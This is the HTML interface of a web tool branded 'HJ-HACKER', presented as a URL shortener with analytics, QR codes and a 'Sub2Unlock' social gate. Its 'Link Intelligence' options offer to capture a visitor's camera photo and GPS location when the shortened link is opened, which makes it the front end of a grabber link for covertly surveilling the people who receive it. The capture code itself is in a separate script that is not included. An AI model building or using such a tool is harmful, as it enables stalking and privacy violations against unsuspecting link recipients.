<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <title>HJ-HACKER | Advanced URL Shortener</title>
    <link rel="stylesheet" href="style.css">
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
</head>
<body>
    <div class="app">
        <!-- Sidebar -->
        <aside class="sidebar">
            <div class="logo">
                <span class="hj">HJ</span><span class="hacker">HACKER</span>
            </div>
            <nav class="nav">
                <button class="nav-btn active" data-tab="create">📝 Create Link</button>
                <button class="nav-btn" data-tab="analytics">📊 Analytics</button>
                <button class="nav-btn" data-tab="media">🖼️ Media Hub</button>
                <button class="nav-btn" data-tab="recent">🕒 Recent</button>
            </nav>
            <div class="sidebar-footer">
                <p>⚡ BY HJ-HACKER</p>
            </div>
        </aside>

        <!-- Main Content -->
        <main class="main">
            <!-- Create Tab -->
            <div id="createTab" class="tab active">
                <div class="card">
                    <h1>Create Short <span class="highlight">Link</span></h1>
                    
                    <div class="form-group">
                        <label>🔗 Destination URL</label>
                        <input type="url" id="longUrl" placeholder="https://example.com/your-long-link" class="input">
                    </div>

                    <div class="form-group">
                        <label>🎯 Custom Alias (Optional)</label>
                        <div class="alias-wrapper">
                            <span class="domain-prefix">hj.os/</span>
                            <input type="text" id="customCode" placeholder="my-custom-link" maxlength="15" class="alias-input">
                        </div>
                    </div>

                    <!-- Password Protection -->
                    <div class="toggle-item">
                        <label class="toggle-switch">
                            <input type="checkbox" id="passwordToggle">
                            <span class="toggle-slider"></span>
                        </label>
                        <span>🔒 Password Protection</span>
                    </div>
                    <div id="passwordSection" class="hidden">
                        <input type="password" id="password" placeholder="Enter password" class="input">
                    </div>

                    <!-- Social Gate -->
                    <div class="toggle-item">
                        <label class="toggle-switch">
                            <input type="checkbox" id="socialToggle">
                            <span class="toggle-slider"></span>
                        </label>
                        <span>📱 Social Gate (Sub2Unlock)</span>
                    </div>
                    <div id="socialSection" class="hidden social-section">
                        <select id="socialIcon" class="input">
                            <option value="youtube">YouTube</option>
                            <option value="instagram">Instagram</option>
                            <option value="twitter">Twitter</option>
                            <option value="facebook">Facebook</option>
                            <option value="whatsapp">WhatsApp</option>
                            <option value="linkedin">LinkedIn</option>
                            <option value="tiktok">TikTok</option>
                        </select>
                        <input type="text" id="socialTitle" placeholder="Title (e.g., Follow our channel)" class="input">
                        <input type="url" id="socialUrl" placeholder="Social profile URL" class="input">
                        <input type="text" id="socialDesc" placeholder="Description (optional)" class="input">
                        <input type="text" id="socialButton" placeholder="Button text (e.g., Verify & Continue)" class="input" value="Verify & Continue">
                    </div>

                    <!-- Animation Style -->
                    <div class="form-group">
                        <label>🎬 Animation Style</label>
                        <div class="radio-group">
                            <label><input type="radio" name="animation" value="ring" checked> RGB Ring</label>
                            <label><input type="radio" name="animation" value="bar"> Loading Bar</label>
                        </div>
                    </div>

                    <!-- Intelligence Features -->
                    <div class="form-group">
                        <label>🕵️ Link Intelligence</label>
                        <div class="intel-options">
                            <label class="checkbox-label">
                                <input type="checkbox" id="captureCamera"> 📸 Capture Camera
                                <small>Takes visitor's photo</small>
                            </label>
                            <label class="checkbox-label">
                                <input type="checkbox" id="captureLocation"> 📍 Capture Location
                                <small>Requests GPS coordinates</small>
                            </label>
                        </div>
                    </div>

                    <!-- Expiration -->
                    <div class="form-group">
                        <label>⏰ Expiration Date (Optional)</label>
                        <input type="datetime-local" id="expiresAt" class="input">
                    </div>

                    <button id="shortenBtn" class="btn-primary">⚡ Create Short Link</button>

                    <div id="loading" class="loading hidden">
                        <div class="spinner"></div>
                        <p>Creating your link...</p>
                    </div>
                    <div id="error" class="error hidden"></div>
                    <div id="result" class="result hidden">
                        <div class="result-header">
                            <span>✅ Link Created!</span>
                            <button id="copyBtn" class="btn-secondary">📋 Copy</button>
                        </div>
                        <div class="result-link" id="shortLink"></div>
                        <div id="qrCode" class="qr-code"></div>
                    </div>
                </div>
            </div>

            <!-- Analytics Tab -->
            <div id="analyticsTab" class="tab hidden">
                <div class="card">
                    <h2>📊 Link Analytics</h2>
                    <div id="analyticsList" class="analytics-list">
                        <p style="color: #666;">Select a link to view analytics</p>
                    </div>
                </div>
                <div id="analyticsDetail" class="card hidden">
                    <h3 id="analyticsCode"></h3>
                    <div class="stats-grid" id="statsGrid"></div>
                    <div id="visitorsList" class="visitors-list"></div>
                </div>
            </div>

            <!-- Media Hub Tab -->
            <div id="mediaTab" class="tab hidden">
                <div class="card">
                    <h2>🖼️ Media Hub</h2>
                    <div class="upload-area" id="uploadArea">
                        <input type="file" id="fileInput" multiple accept="image/*" hidden>
                        <button id="uploadBtn" class="btn-primary">📤 Upload Images</button>
                        <p class="upload-hint">or drag & drop images here</p>
                    </div>
                    <div id="mediaGrid" class="media-grid"></div>
                </div>
            </div>

            <!-- Recent Tab -->
            <div id="recentTab" class="tab hidden">
                <div class="card">
                    <h2>🕒 Recent Links</h2>
                    <div id="recentList" class="recent-list"></div>
                    <button id="clearRecent" class="btn-danger hidden">Clear All</button>
                </div>
            </div>
        </main>
    </div>

    <script src="script.js"></script>
</body>
</html>
